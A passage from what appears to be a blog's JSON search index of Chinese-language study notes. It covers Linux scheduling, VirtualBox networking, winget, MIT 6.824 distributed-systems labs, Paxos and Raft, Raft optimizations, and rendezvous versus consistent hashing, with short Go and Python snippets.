schedule\n把每個proc當成有一個cpu，所以假設每個proc都完美的同時跑的話，每個proc的執行時間應該一樣長\ncfs就是多一個vruntime去模擬每個proc的執行時間，每次挑都挑最少vruntime的\n如果要sort又要支援找出最小，heap\n而剛好linux實作rbtree可以用\n算vruntime也很簡單\n實際上的執行時間乘上proc比重的比值，只是kernel中最好不用除法所以要改成用乘的\n\nRef\nLinux 核心設計: 記憶體管理\nLinux内核内存管理算法Buddy和Slab\nlinux 的swap、swappiness及kswapd原理\n【原创】（十五）Linux内存管理之RMAP\nLinux OOM killer机制介绍\nLinux 核心設計: RCU 同步機制\n【原创】（五）Linux进程调度-CFS调度器\n理解LINUX的MEMORY OVERCOMMIT\n内存管理\n","categories":["Linux","FAQ","Reading"]},{"title":"virtualbox的網路種類","url":"/2022/01/virtualbox-net-type/","content":"動機\n因為vagrant上vmware的支援太少了!!\n只好來看virtualbox，但一如既往，難用\n\n整體而言\n\n附著到實體\n\nBridged Adapter\n\n\n\n\n\n\n什麼都不要\n\nNot Attached\n\n\nNAT somehow\n\n這裡要想像成每個VM都在自己的network namespace(vswitch)\n每個VM都在自己的ns\n\nNAT\n\n\n特點\n\n每個VM無法互相溝通\n每個VM拿到的ip都一樣\n\n\n\n\n\n\n讓VM共用一個namespace\n\nvswitch會接到實體\n\nNAT network\n\n\n\n\n\n\nvswitch不會接到實體\n\nHost-only Adapter\n\n\n\n\nInternal Network\n\n\n\n\n\n\n\n\n\n\n\n結論\n不要用virtualbox模擬網路環境，DHCP不是DHCP，NAT也不是真正的NAT\n用VMware會開心(符合預期)的多\nRef\nVirtualBox Network Settings: Complete Guide\n","categories":["Network","Tips"]},{"title":"怎麼用winget","url":"/2022/01/winget/","content":"動機\n之前重灌電腦看到的，因為是windows內建所以來看一下\n其實就是另一個chcoc，但可以在microsoft store上拿到\n\n安裝\n目前是win11 21H2 build 22000.376\n\n上microsoft store更新，app installer\n\n用法\n\nwinget search name\n之後挑列出來的id\n\nwinget install id\n\n\n\n需要改進的地方\n\n安裝時不會看有沒有裝過，是直接下載exe跑，等到報錯才會停下來\n沒有整合windows updates\n\nwinget ugprade -all可以更新裝的app但沒有windows updates\n\n\n\n","categories":["Windows","Tips"]},{"title":"mit 6.824 2022 實驗筆記","url":"/2022/03/6-824-lab-notes/","content":"動機\n下面紀錄做lab遇到的坑\n我做完6.824的所有lab時，他們還在上課，所以code不能貼\n\n能得到什麼\n\n怎麼用lock\n分散式系統怎麼設計\n怎麼設計log要印什麼與用log去debug\n面對絕望的勇氣與滿滿的成就感\n\n這堂課好在哪\n\n所有材料都在網路上，連同所有測試\n有可以參考的code與心得 (但網路上的code真的就是參考而已，因為有的也沒有實現好或是實現得異常複雜)\n\nlab1\n實現一個單機版的mapreduce，這個基本上就是給大家練習golang的\n可以不用任何一個lock完成這個lab\n重點是知道mapper與reducer到底要做什麼\nmapper把資料對到一個reducer(可以當成一個shard)，reducer做接下來的事\nlab2\n實現一個有基本功能、log compaction、log fast back的raft\n細節十分多，十分可怕\n下面是一些整體的重點\n\n先用一個lock就好\n\n之後會引入其他lock，要嚴格遵守拿lock的order\n引入lock後method互相call可能會call到有lock的，要自己定義那些method需要lock那些不需要\nlock與unlock可以用method包裝，之後如果有deadlock會很好trace\n\n\n不要提早切太細分成很多struct與method (除了log的操作!!)\n\n之後上lock會把自己搞死，除了deadlock還是deadlock\ndebug的log也會很難看 (會不知道是哪台server做的)\n\n\n思考為什麼raft不會錯，不是只有為什麼會對\n\n正確性的來源是?\n\n投票與log的關係是?\nterm的意義是?\n\n\n為什麼只需要persist那3項資料就好?\n\nraft怎麼意識到時間流逝(事件發生)\n\n\npersist的資料與正確性的關係是?\nfig 2的描述怎麼實現(保持)正確性?\n\n\nlog要把所有狀態與自己是誰print出來\n\n之後debug就是透過自己replay log來完成，沒有gdb，沒有\nprint可以直接用%v\n\n\n去看student guide與lab hint\n\nlab2a\n這是實現投票的part(RequestVote rpc)，很簡單，也是惡夢的開始!!\n因為這個不涉及log，導致隨便寫都能過test，但投票才是確保log會是最新的重要條件!!\nlab2b\n這是實現log的part(AppendEntries rpc)，情況變得複雜起來，要處理log與apply\n這裡就會把前面lab2a沒寫好的部分暴露出來\n\n要確認所謂的at least up-to-date是什麼意思 (log比較長 或是 一樣長但是last log的term比較大或等於)\n有沒有處理term不對要變成follower (有人說可以只讓leader變成follower就好，但我試了之後會報錯)\n\n接著就是AppendEntries，\n\nheartbeat不特別!! 如果你看到你的code有if len(entries) == 0有很高的機率你的code是錯的\n\n在client push東西後其實可以只透過heartbeat去更新log (但是很慢)\n\n\ncandidate或是leader要變成follower，也只能是follower\n有沒有處理term不對要變成follower\n有沒有正確的trim log與merge entries\n\napply log到client的時候，\n\n要確認是不是自己的term\ncommit index夠不夠大 (其實只要有更新commit index就可以試著apply了，不用讓另一個thread去monitor commit index的變化)\n\nlab2c\n這是實現log fast back與persist的部分\npersist不難，只要記得，只在persisting state變動時做persist!!\nlog fast back有很多版本，可以去看教授的也可以做conflict index\n聽起來都還好，但是這裡的test多的unreliable，也就是network partition、restart都加進來測，所以\n\ntest花的時間變多了\ntest會過不代表你的code是對的，有可能只是幸運\n\n有一次是跑50次在第49次fail其他都pass…\n\n\n\n這裡整理一下遇過的錯\n\napply error: 同一個index上傳了不同的log\n\n你的RequestVote或AppendEntries或apply log寫錯了，要回去看fig 2\n\n\nfail to reach agreement(livelock): 怎麼沒有leader或是一直有candidate跳出來\n\n你的RequestVote與AppendEntries寫錯了\nelection&amp;heartbeat timer有沒有在對的時候reset\n\nterm不對要變成follower時要reset (這邊fig 2沒有寫但是要)\n\n\nheartbeat timer的時間太長 或 election timer太短\n\n\ndeadlock\n\n看看你的method有沒有用到lock\n\n\n\nlab2d\n這是實現log compaction，原本是在lab3b，但現在搬來這裡\n要做InstallSnapshot，這不難，把前面的rpc拿來改，這裡的重點是\n\n怎麼處理被trim過的log\n同時，前面的code也要能動\n\n當初就是在這邊把apply log改成appiler的，因為\n\n因為tester的channel沒有buffer，不這樣做就等於在raft的lock中拿另一個lock，之後就會deadlock\n\n前往lab3之前\n要先大量測試你的raft都會過所有test，在這邊查出的問題越多之後的問題越少\n只會剩下性能問題\nlab3\n利用你的raft建立一個容錯、線性一致的key-value db\n這裡要注意的就是如果遇到重複、過期的request要怎麼處理?\n引入序列號，這裡要client與server定義怎麼處理序列號，之後server就是照序列號一個一個處理上去\n還有要處理如果leader壞了，之前commit的東西其實要重新丟一次(index與term對不上，可以看student guide的Re-appearing indices)\n這裡還會對kv db做performance test，如果太慢要回去看raft!!\n像我是之前raft做persist太多次，時間花太久\n還有get要放到raft中同步給大家，不然不會有線性一致\nlab4\n現在把kv db拆成一個一個shard，分散在不同的raft group中，shard會在不同的raft group中移來移去\nlab4a\n產生每個shard對應到哪個group的configuration\n這裡就是把lab3拿來改就好，把put/get換成join/leave，但要注意的是產生config的演算法一定要determinstic\n不能同一個input之後每台server產生的config不一樣 (go的map走訪是undeterminstic)\nlab4b\n要做提供kv db與shard migration的server\n這裡要處理shard migration，也是當初卡最久的地方，因為要自己設計這一塊，不像raft還有paper可以參考\n同時也可以把challenge 1與2一起考慮進去\nshard migration有兩種方式一個是主動push或是自己pull，兩種都差不多，但要注意的是\n只有在所有shard都完成migrate才能使用新的config，不然會看到兩個一樣的shard同時在服務或是shard去不到該去的地方!!\n另外有人提到要做no-op，因為raft的leader只能commit自己term的log，之後前面沒有commit的log也會被一起commit (詳情見raft paper的fig 8)\n所以可能有一種情況是在前一個leader commit之前就壞了，之後選出新leader，但是client沒有塞任何東西，導致raft不apply log以及client等不到commit\n所以no-op就是在新leader產生時可以丟一個沒有任何意義的commit出去，把前面還沒commit的給commit上去 (但6.824的lab沒做也是pass)\n在確定shard migration的設計之後遇到的bug是shard deletion (challenge 1)明明會pass但是因為花太久時間變成fail\n這裡試過\n\nshard migration從一次一塊變成一次一個group\n把大lock分成shard與pusher一人一個\n\n在處理的時候發現慢慢code變回OOP的樣子，很奇妙\n\n\n從存一整個configuration變成只存用的到的部分\nget的結果不用raft傳回來\n\n但頂多從330秒變成318秒而已 (還有看到有人用zlib，wow)\n最後是把timeout重試的時間調短(從3秒變成500ms)，大概60秒就做完了，wow\n所有lab之後\n6.824其實沒有把每個用的分散式系統用到的手法的名字在課堂上介紹，反而是每堂課就是一篇paper看別人怎麼設計與遇到的困難是什麼，所以有人說6.824沒有什麼架構\n但其實這些手法在做lab時就會被實現出來，但lab沒有涉及到transaction的部分，還有那些手法的名字還是可以認識一下，所以可以去讀data-driven internsive application\n還有raft其實與實際用的差很多，工業的raft有許多優化手段，像readIndex或lease read，許多工業級的raft都可以看看\nRef\nMIT 6.824 lab心得\n","categories":["System","Distributed"]},{"title":"6-824的question","url":"/2022/03/6-824-questions/","content":"動機\n當成複習\n\nGFS\n\nDescribe a sequence of events that would result in a client reading stale data from the Google File System.\n\n就是這張圖\n\n只要一個secondary沒有寫到，primary只會回fail，之後client retry，就有了這個畫面。\nVM FT\n\nHow does VM FT handle network partitions?\nThat is, is it possible that if the primary and the backup end up in different network partitions that the backup will become a primary too and the system will run with two primaries?\n\nTest-and-Set，有搶到就當leader，沒搶到就自己放棄\nraft\n\nSuppose we have the scenario shown in the Raft paper’s Figure 7: a cluster of seven servers, with the log contents shown.\nThe first server crashes (the one at the top of the figure), and cannot be contacted.\nA leader election ensues.\nFor each of the servers marked (a), (d), and (f), could that server be elected?\nIf yes, which servers would vote for it?\nIf no, what specific Raft mechanism(s) would prevent it from being elected?\n\n上requestVote的code\nfunc (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) &#123;\trf.Lock()\tlastIdx := rf.getLastLogIdxX()\tlastTerm := rf.getLogTermX(lastIdx)\tif args.Term &lt; rf.Term &#123;\t\treply.VoteGranted = false\t&#125; else &#123;\t\tif args.Term &gt; rf.Term &#123;\t\t\trf.setFollowerX(args.Term, -1)\t\t&#125;\t\tif rf.VoteFor != -1 &amp;&amp; rf.VoteFor != args.Id || !(lastTerm &lt; args.AtTerm || lastTerm == args.AtTerm &amp;&amp; lastIdx &lt;= args.AtIndex) &#123;\t\t\treply.VoteGranted = false\t\t&#125; else &#123;\t\t\treply.VoteGranted = true\t\t\t//DPrintf(&quot;(%v) [RequestVote] accept1 args:%v log:%v&quot;, rf.Me, args, rf.Log)\t\t\trf.setFollowerX(args.Term, args.Id)\t\t\trf.resetElectionTimer()\t\t&#125;\t&#125;\treply.Term = rf.Term\trf.Unlock()&#125;\n省略，term與投過的case，重點是\n!(lastTerm &lt; args.AtTerm || lastTerm == args.AtTerm &amp;&amp; lastIdx &lt;= args.AtIndex)\n\n看最後一個log的term\n最後一個log的term一樣就比長度\n\na會拿到b, e, f的票，所以可以成為leader\nd任何票都拿的到，所以可以成為leader\nf最後一個log的term比任何人都小，不可能成為leader\n\nCould a received InstallSnapshot RPC cause the state machine to go backwards in time?\nThat is, could step 8 in Figure 13 cause the state machine to be reset so that it reflects fewer executed operations?\nIf yes, explain how this could happen. If no, explain why it can’t happen.\n\n根據Log Matching，entry的index與term不會變\n根據Leader Completeness，被commit的entry之後都會在log中\n根據State Machine Safety，被apply之後就不會被apply別的entry\n也就是說，commit過的log等於state machine\n因為installSnapshot是只trim commit過的log，所以reset state machine沒差\nZookeeper\n\nOne use of Zookeeper is as a fault-tolerant lock service (see the section “Simple locks” on page 6).\nWhy isn’t possible for two clients to acquire the same lock?\nIn particular, how does Zookeeper decide if a client has failed and it can give the client’s locks to other clients?\n\n就flock\n用EPHEMERAL創個檔案，exist就是有人上鎖。\n其他要等的就是上watch，之後就算lock holder出事zookeeper也會自己清這個檔案(鎖)，其他人透過watch知道unlock\nChain Replication\n\nSuppose Chain Replication replied to update requests from the head, as soon as the next chain server said it received the forwarded update, instead of responding from the tail.\nExplain how that could cause Chain Replication to produce results that are not linearizable.\n\n這個就與raft沒有等到過半就commit一樣\n如果不是最後一個好了才reply，有可能中間出事之後後面的server就會少這筆write\nDistributed Transactions\n\n6.033 Book.\nRead just these parts of Chapter 9: 9.1.5, 9.1.6, 9.5.2, 9.5.3, 9.6.3.\nThe last two sections (on two-phase locking and distributed two-phase commit) are the most important.\nThe Question: describe a situation where Two-Phase Locking yields higher performance than Simple Locking.\n\nSimple Locking: 先全拿lock，再跑，之後全放\nTwo-Phase Locking: 一個一個拿，等跑完，再一個一個放\nA: read x, write y\nB: read y\nsimple會變成B要等A做完才能跑(或是A等B)\n2PL可以是先read x(A), read y(B), write y(A)\nSpanner\n\nSpanner Suppose a Spanner server’s TT.now() returns correct information, but the uncertainty is large.\nFor example, suppose the absolute time is 10:15:30, and TT.now() returns the interval [10:15:20,10:15:40].\nThat interval is correct in that it contains the absolute time, but the error bound is 10 seconds.\nSee Section 3 for an explanation TT.now().\nWhat bad effect will a large error bound have on Spanner’s operation?\nGive a specific example.\n\nr/w commit要等到他的timestamp結束，所以誤差越大r/w commit要等越久\nFrangipani\n\nSuppose a server modifies an i-node, appends the modification to its log, then another server modifies the same i-node, and then the first server crashes.\nThe recovery system will see the i-node modification in the crashed server’s log, but should not apply that log entry to the i-node, because that would un-do the second server’s change.\nHow does Frangipani avoid or cope with this situation?\n\n有人需要某個檔案是被已經crash的server改過的會怎樣?\nFrangipani的client在改file之前會把op送到Petal的log，所有crash有兩個case\n\n有log\n沒log\n\n有log就讓要求lock的server去replay\n沒有log就直接上\nreplay就帶來現在問的問題，如果多台(其中有crash的)改到同一個file怎麼辦?\n怎麼處理衝突?\n檔案(inode)有版本號，所有op都有版本號+1，這樣只要op的版本號小於inode的，就不用管\nCOPS\n\nThe last sentence in Section 4.3 says a client clears its context after a put, replacing the context with just the put.\nThe text observes “This put depends on all previous key-version pairs and thus is nearer than them.”\nWhy does clearing the context and replacing it with just the put make sense?\nYou might think that the client’s subsequent puts would need to carry along the dependency information about previous gets.\nWhat entity ultimately uses the context information, and why does it not need the information about gets before the last put?\n\n回想raft的snahpshot的問題，為什麼snapshot不會讓state machine後退?\n因為snapshot的都是commited的log\n在這裡log就是context，也就是執行過的指令(所以有遞移性)。\n一旦執行完成就是commited，所以可以刪掉(因為狀態被改變了，前面的也沒用了)\n那為什麼讀的指令要保留?\n讓後面的讀可以知道前面的讀已經發生，確保順序\n(可以配合SUNDR的question一起看)\nFaRM\n\nSuppose there are two FaRM transactions that both increment the same object.\nThey start at the same time and see the same initial value for the object.\nOne transaction completely finishes committing (see Section 4 and Figure 4).\nThen the second transaction starts to commit. There are no failures.\nWhat is the evidence that FaRM will use to realize that it must abort the second transaction? At what point in the Section 4 / Figure 4 protocol will FaRM realize that it must abort?\n\nFaRM是樂觀鎖，所以它會讓其他人做事，出事(FaRM透過檢查確認出事)再retry\n悲觀鎖是先讓對方等\nFaRM前面有兩個檢查階段\n\nLOCK\nVALIDATE\n\n都會檢查lock與資料的版本號\nLOCK可以當成是檢查寫過的\nVALIDATE是有讀到的\n這題是在同一個變數做++，所以在LOCK會被abort\nMemcache at Facebook\n\nSection 3.3 implies that a client that writes data does not delete the corresponding key from the Gutter servers, even though the client does try to delete the key from the ordinary Memcached servers (Figure 1).\nExplain why it would be a bad idea for writing clients to delete keys from Gutter servers.\n\ngutter是備援選手，在主server出事時接手\n同時cache的目的是不要讓大量traffic打爆backend\n所以回答問題，為什麼不用invalidate gutter?\ngutter的key的過期時間很短，取代invalidate，雖然說會有一點stale data，但這樣可以確保backend不會被打爆\nSUNDR\n\nIn the simple straw-man, both fetch and modify operations are placed in the log and signed.\nSuppose an alternate design that only signs and logs modify operations.\nDoes this allow a malicious server to break fetch-modify consistency or fork consistency? Why or why not?\n\n可以回去想為什麼raft的read要過raft的共識\n如果沒有過共識，read可能拿到缺了某些write的state\nSpark\n\nWhat applications can Spark support well that MapReduce/Hadoop cannot support?\n\n密集運算或是需要反覆r/w的場合\nBitcoin\n\nTry to buy something with Bitcoin. It may help to cooperate with some 6.824 class-mates, and it may help to start a few days early. If you decide to give up, that’s OK. Briefly describe your experience.\n\n沒$，跳過\nBlockstack\n\nWhy is it important that Blockstack names be unique, human-readable, and decentralized?\nWhy is providing all three properties hard?\n\n因為name是識別user的方法，也是資安的開始，所以重要\nunique: 不能重複\nhuman-readable: 方便使用\ndecentralized: 解釋權不被壟斷\nhuman-readable + decentralized: 自己的筆記\nhuman-readable + unique: email\nunique + decentralized: public key\ncentralized很像root folder，在裡面可以human-readable與unique\n一但decentralized就很容易撞名\n","categories":["System","Distributed"]},{"title":"paxos到zab再到raft","url":"/2022/03/paxos-raft-zab/","content":"動機\n整理一下\n\n總體而言\n在任何時間點，於不能反悔的情況下維持共識\npaxos與其他共識演算法都是在保護上面假設\n實際如何執行?\n\n不能反悔 (資料保持最新 &amp; 承認時間流逝)\n\n遞增\n冪等\nimmutation\n\n\n共識\n\n多數決\n單一來源\n\n\n描述時間\n\n序列號\n\n\n\n下面根據paper的時間線來看\n\nbasic paxos\nmulti-paxos\nzab\nraft\n\nbasic paxos\n有兩個角色，proposer與accepter\n(對應到raft是leader與follower)\n之後與raft不同的是paxos可以同時管理好幾個app的狀態(所以paxos可以接受不連續的log，因為log不用遞增)\n在paxos就是value去區分，每個value都會帶有一個只能遞增的rnd，與當前acceptor知道的最後一個rnd(log的最後index)\npaxos的proposer是任何人都能當的，但要怎麼確認自己的提案會不會被接受?\n所以proposer要先問過半的accepter的最大rnd(prepare)\n同時acceptor設定之後預期看到的rnd，也就是last_rnd\n在下面的圖，log entry整個大概是(last_rnd, value[vrnd])\n另外，記得last_rnd不論何時一定大於等於vrnd\n不論在什麼階段，prepare或是accept\n\n\n\n(假設還有其他資料，像是log，就要再額外sync，見zab，不過basic paxos沒有所以這段上括號)\n之後才傳資料，只要rnd(aka log)對的上就收(accept)。\n\n另外paxos這樣可能會產生livelock，只要有兩個proposer打同一個value就會產生，所以要區隔時間(raft的election timer)\n到此，classic paxos可以看成quorum + 2 phase commit\n原本的2 phase commit要所有人確認，但因為這是共識只要quorum到就好\n定義quorum\n為什麼要到quorum?\n因為這樣可以確保任意讀與寫至少都會有一個有對的資料\n如果只是要符合&quot;至少都會有一個有對的資料&quot;，這樣一定要過半嗎?\n不用，像是\n\n要求每個quorum都包含一個特定點\n分階層，要求quorum至少要跨一行與跨一欄\n只有兩行，要求包含第一行的majority, 或在每一行都包含一个majority\n\n這樣有什麼好處與壞處?\n好處: 可以以較少的數量達成quorum，如此一來可以選近的 或是 發少一點rpc\n壞處: 犧牲avaibility，像是只要是包含的那個唯一的點壞了就出事了；但過半可以讓另一半壞了也ok\n正確性\nvalue的rnd保證不反悔app狀態同時代表時間點\n先問過半的accepter的最大id確保app狀態共識\nmulti-paxos\n如果說每次都要同步log才能傳資料就很麻煩另外還有livelock的風險\n所以把proposer定成一個這樣就能省下同步log的步驟\n正確性\nproposer只要有最新的id，之後就可以commit到acceptor，等commit完成後就proposer又會有最新的id (遞迴)\nfast paxos\n真的不想prepare!!\n那就直接寫，用最小的rnd去寫。\n失敗的話，還是要prepare阿\n有沒有辦法在報錯時確認當前的quorum是什麼?\n\n所以quorum要變成3/4\n\nzab\n就是multi-paxos + 選leader\n但這樣打太短要補一點東西\nzab分成4個階段\n\nelection\n\n\n透過zxid來選其實就是\n\nterm (這裡叫epoch)\nid (就是paxos的id)\n\n\n之後記住自己投給誰\n\n\ndiscovery (prepare)\nsync (sync log)\nbraodcast (accept)\n\n選leader的正確性\nleader會壞怎麼辦?\n\n選leader也要在任何時間點，於不能反悔的情況下維持共識\n\n所以多了term與voteFor，term表示時間、voreFor就是資料\n\n\n\nraft\n如果只有一個app要管而已，可以簡化設計嗎?\n\n只放一個log，那可以直接用log遞增取代id\n只有一個log，可以在選leader直接認最新log的為leader\n- 也因此，同步log的時機與paxos不同\n\npaxos因為任何人都可以當proposer，所以一開始就要sync log\nraft是在成為leader之後才透過appendEntries同步log\n\n但可能有不一致的log，所以才有figure 8\n\n\n\n\n\n整個dataflow可以看成\nleader -&gt; log\n因為leader要過半，所以是共識；\n認leader自然imply認log； (appendEntries)\n接著就是認leader不能反悔；\n最後就是commit出去的不能變，所以有過半才能commit；\n但是只有這樣會產生figure 8的問題，所以要多一個條件\n只能在同一個term完成同一個term的事件\n因為只有在完成appendEntrries之後才能確認，follower的log與leader同步，而唯一能讓leader發appendEntrries只有新log或是heartbeat。\n正確性\n\n不能反悔\n\n\nterm只能遞增\n\n只能在同一個term完成同一個term的事件 (第一個處理亂序與crash的手法)\n\n\nleader的log只能遞增\n\n\n共識\n\n\n每個term的leader最多一個\n\n用誰的log比較新決定leader\n\n認term與log對不對得起來\n\n\n\n\nleader持有夠新的log且過半(一樣新或是比較舊)\n\nlog最新的log會過半\n\n有新log會reject其他candidate\nfollower會與leader的log同步\n\nmerge相符但是比較短的entries (第二個處理亂序的手法)\n砍掉開始不一樣的log\n\n\n\n\n\n\n過半才做下一個步驟\n\n成為leader (leader最多一個)\ncommit log上去 (確定新的log占多數)\n\n\n\n\n在同一個term完成同一個term的事件 (raft獨有)\n\n\nfigure 8\n\n因為是等到appendEntrries才sync log (類似lazy eval)\n變成只能在自己的term才能確認log是對的\n\n但是只要確認就能利用 multi-paxos的遞迴 確認前面的log也是對的!!\n\n\n\n\n\nabstract-paxos\n将 paxos 和 raft 统一到一个协议下: abstract-paxos\n這篇就是把原po的quorum與paxos組合在一起，從phase2開始講到phase1\n先有兩個腳色，reader與writer\n我們的algo要保證下面的性質\n\ncommit-寫quorum: 以保證任何 reader 都可讀到.\ncommit-唯一: 以保證多個 reader 返回相同的結果.\ncommit後不能修改: 以保證多次讀返回同樣的結果.\n\n第一點就是寫quorum\n第二與三點就需要能夠比較不同writer的手段(全序關係)，所以寫入的值需要一個commit_index，讓reader知道要拿那個value\nstruct State &#123;    log: Vec&lt;&#123;        commit_index: u64,        cmd: Cmd    &#125;&gt;,&#125;\npaxos叫vrnd，raft叫term\n剛剛是reader的，接著是writer的唯一與不可修改\n會破壞writer的唯一與不可修改就是有沒有可能要寫之前有其他人要寫呢?\n所以我們需要一個機制讓對方承諾說不會接受舊的寫入\n所以就再多一個commit_index\nstruct Node &#123;    commit_index: u64,    state: State,&#125;\npaxos叫rnd，raft叫term與voteFor\n這樣就有兩個phase\nimpl Node &#123;    fn handle_phase_1(&amp;mut self, p1_req: P1Req) &#123;        let p1_reply = P1Reply&#123;            commit_index: self.commit_index            state: self.state,        &#125;;        self.commit_index = max(self.commit_index, p1_req.commit_index());        return p1_reply;    &#125;&#125;\nimpl Node &#123;    fn handle_phase_2(&amp;mut self, p2_req: P2Req) &#123;        let p2_reply = P2Reply&#123;            commit_index: self.commit_index        &#125;;        if p2_req.commit_index &gt;= self.commit_index &#123;            self.state.update(p2_req.state);            self.commit_index = max(self.commit_index, p2_req.commit_index);        &#125;        return p2_reply;    &#125;&#125;\n注意到self.commit_index = max(self.commit_index, p2_req.commit_index)\n這裡就是說node的commit_index一定大於等於state最後一個的commit_index\n這邊也可以從writer的角度來看為什麼raft只能在自己的term做commit\nRef\n可靠分布式系统-paxos的直观解释\n后分布式时代: 多数派读写的’少数派’实现\n","categories":["System","Distributed"]},{"title":"raft優化","url":"/2022/03/raft-optimization/","content":"動機\nraft有一些優化，這邊記錄一些\n主要出自raft作者的博論\n\nBatching\nAppendEntries可以一次累積多一點log再丟出去，把latency往下壓\nPipelining\n因為raft的log一定是遞增，所以raft實際上可以根據任何順序丟log出去，也就是說不用依據follower實際上的最後一位去丟\n直接看netxIndex多少去丟就好，甚至還可以實作reorder\nprevote\n有人經歷network partiotion，這樣他的log一定不會是最新的(不會是leader)\n但是，他的term會異常大!!\n這樣其他人會因為看到這超大的term，被迫變成follower，但因為log的緣故也絕對不會是他當leader，這樣其實很浪費。\n所以，可以多一個階段，prevote，類似zab，先投出一個leader，之後sync log才把epoch(term)推上去，但這裡是先丟自己的log出去，問其他人要不要投，有過半就開啟正式的投票。\nread index\n之前lab3與4的read都要過raft，這真的很慢。\n所以利用leader的log一定有所有commit log的特性。\n\n先丟no-op (確認log與把前面的都commit)\n記下當下的index為readIndex\n等收到過半的reply(其實是要等lastApplied更新)\n之後只要read的指令的index沒有超過readIndex就可以直接回\n\nfollower就可以去問leader當前的readIndex，之後等lastApplied大於這個readIndex，就可以直接回了\nlease read\n有沒有辦法不丟no-op只透過heartbeat更新?\n如果能保證每台機器的時間都是一致的\n收到過半的heartbeat，當成直到election timer啟動前都是leader(所以說要保證時間一致，想想如果leader被pause的話…)\n\n只要確認自己是leader且log有同步(過了appendEntries)，就可以直接回\n發log同時persist\n\nraft是看過半來決定要不要commit，所以\n\n有過，先寫到disk就賺到\n沒過，沒差之後會被其他appenEntries修掉\n\nprofile, hdd效能, test\n這邊是列出dragonboat作者的文章，比起上面的優化，這邊都是屬於實作上的細節，值得一看。\n从共识算法开谈 - 硬盘性能的最大几个误解\n百亿次的锤炼 - 带逛Dragonboat的各类测试 &lt;= 其實6.824的lab3,4都有用到!!\n大规模Go项目几乎必踏的几个坑 - Dragonboat为例\nGo系统性能绕坑工具与方法 - 基于实例的带逛\n让Raft变快100倍 - Dragonboat的写优化\nRef\n博論\n","categories":["System","Distributed"]},{"title":"rendezvous hash與consistent hash","url":"/2022/03/rendezvous-hash-consistent-hash/","content":"動機\n\n先假設\n我們有\nsrv2key = default_dict(list)key2srv = &#123;&#125;srvs = [&#x27;server1&#x27;, &#x27;server2&#x27;, &#x27;server3&#x27;, &#x27;server4&#x27;]\n\nsrv2key: 把server對到負責的key們\nkey2srv: key是哪一個srv負責\nsrvs: 所有server\n\nconsistent hash\n先想像有一個hash可以把string轉成0~2**32-1之間的值\n把servers想像成環上的點，之後分配資料就是利用bsearch找靠近的server\ndef get(k):  hashed = hash(k)  i = bisect(map(hash, srvs), hash(k)) % len(srvs)  srv2key[srvs[i]] += [k]  key2srv[k] = srvs[i]  return ret\n刪server時，只要往把原本的server資料往前丟就好\ndef del_server(srv):  keys = srv2key[srv]  oldSrv = srvs.index(srv)  del(srvs, oldSrv)  del(srv2key, oldSrv)  newSrv = srvs[oldSrv+1 % len(srvs)]  srv2key[newSrv] += keys  for k in keys:    key2srv[k] = newSrv  # 其實也可以 [get(k) for k in keys]\nrendezvous hash\n可以把consistent hash擴展成把所有server加進來比，選一個分數最高的\ndef get(k):  ret = max(srvs, key=lambda srv: score_aka_hash(srv, k))  srv2key[ret] += [k]  key2srv[k] = ret  return ret\n刪server時，就變成每個key都要重新map\ndef del_server(srv):  keys = srv2key[srv]  oldSrv = srvs.index(srv)  del(srvs, oldSrv)  del(srv2key, oldSrv)  [get(k) for k in keys]\nrendezvous hash &amp; consistent hash\nrendezvous hash根據hash function，可以讓key平均分配在server上\n但是如果要add/del server是個大工程。\nconsistent hash在處理add/del server簡單的多，同時查找是log n不是n。\n但是如果有hotspot，就要自己調整virtual node去調。\nrendezvous hash的實際例子\n從wiki上改來的，from New Hashing Algorithms for Data Storage\nimport mmh3import mathdef int_to_float(value: int) -&gt; float:    &quot;&quot;&quot;Converts a uniformly random 64-bit integer to uniformly random floating point number on interval [0, 1).&quot;&quot;&quot;    fifty_three_ones = 0xFFFFFFFFFFFFFFFF &gt;&gt; (64 - 53)    fifty_three_zeros = float(1 &lt;&lt; 53)    return (value &amp; fifty_three_ones) / fifty_three_zerosclass Node:    &quot;&quot;&quot;Class representing a node that is assigned keys as part of a weighted rendezvous hash.&quot;&quot;&quot;    def __init__(self, name: str, seed, weight) -&gt; None:        self.name, self.seed, self.weight = name, seed, weight    def __str__(self):        return &quot;[&quot; + self.name + &quot; (&quot; + str(self.seed) + &quot;, &quot; + str(self.weight) + &quot;)]&quot;    def compute_weighted_score(self, key):        _, hash_2 = mmh3.hash64(str(key), 0xFFFFFFFF &amp; self.seed)        hash_f = int_to_float(hash_2)        score = 1.0 / -math.log(hash_f)        return self.weight * scoredef determine_responsible_node(nodes, k):    &quot;&quot;&quot;Determines which node, of a set of nodes of various weights, is responsible for the provided key.&quot;&quot;&quot;    return max(nodes, key=lambda n: n.compute_weighted_score(k))node1 = Node(&quot;node1&quot;, 123, 100)node2 = Node(&quot;node2&quot;, 567, 200)node3 = Node(&quot;node3&quot;, 789, 300)print(str(determine_responsible_node([node1, node2, node3], &#x27;foo&#x27;)))print(str(determine_responsible_node([node1, node2, node3], &#x27;bar&#x27;)))print(str(determine_responsible_node([node1, node2, node3], &#x27;hello&#x27;)))\nRef\nRendezvous Hashing: an alternative to Consistent Hashing\nConsistent Hashing Algorithm: 應用情境、原理與實作範例\nRendezvous hashing\nconsistent hashing vs. rendezvous (HRW) hashing - what are the tradeoffs?\n","categories":["Algorithm","System","Distributed"]},{"title":"metaclass - class與instance的融合","url":"/2020/10/metaclass/","content":"動機\n之前欠的要補…\n\n希望你知道…\n\ninterpreter的結構\nscheme(或lisp)\n\nclass的演化\nlambda的部分是interpreter的一部份code\n其實這裡的重點是struct(這裡叫record)有什麼，只要了解為什麼struct這樣設計大概就會了解到底發生什麼事\nclass &amp; instance\n把東西分成class與class之下的instance\ninstance有\n\n其所屬的class\nattribute的值\n\nclass有\n\nclass var的symbol(名字)\nclass var的值\nattribute的symbol(名字)\nmethod的表(method_name =&gt; real_proc)\n\n(define-record instance (class i-vals))(define-record class (c-vars c-vals i-vars m-env))(lambda (exp env class inst)    (variant-case exp                  (i-varref (var)                            (lookup var                                    (class-&gt;i-vars (something-&gt;value class))                                    (instance-&gt;i-vals (something-&gt;value inst))))                  (c-varref (var)                            (lookup var                                    (class-&gt;c-vars (something-&gt;value class))                                    (class-&gt;c-vals (something-&gt;value class))))                  (i-varassign (var exp)                               (let ((value (eval-exp exp env class inst)))                                 (void-&gt;expressed                                  (assign! var                                           value                                           (class-&gt;i-vars (something-&gt;value class))                                           (instance-&gt;i-vals (something-&gt;value inst))))))                  (c-varassign 